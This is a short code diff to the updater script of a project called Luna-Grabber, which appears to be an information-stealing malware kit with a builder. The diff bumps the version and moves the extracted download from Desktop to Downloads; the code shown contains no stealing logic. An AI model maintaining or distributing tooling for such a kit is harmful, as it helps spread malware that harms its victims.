@@ -8,14 +8,14 @@ import requests
 
 class Update():
     def __init__(self):
-        self.version = '1.5.7'
+        self.version = '1.5.8'
         self.github = 'https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/tools/update.py'
         self.zipfile = 'https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip'
         self.update_checker()
 
     def update_checker(self):
         code = requests.get(self.github).text
-        if "self.version = '1.5.7'" in code:
+        if "self.version = '1.5.8'" in code:
             print('This version is up to date!')
             sleep(1)
             print('You can now open builder.pyw to open the builder!')
@@ -38,9 +38,9 @@ class Update():
                 with open("Luna-Grabber-main.zip", 'wb')as zipfile:
                     zipfile.write(new_version_source.content)
                 with ZipFile("Luna-Grabber-main.zip", 'r') as filezip:
-                    filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Desktop"))
+                    filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Downloads"))
                 os.remove("Luna-Grabber-main.zip")
-                print('The new version is now on your desktop.\nUpdate Complete!')
+                print('The new version is now in your Downloads folder.\nUpdate Complete!')
                 print("Exiting...")
                 sleep(5)
             if choice.lower() == 'n':
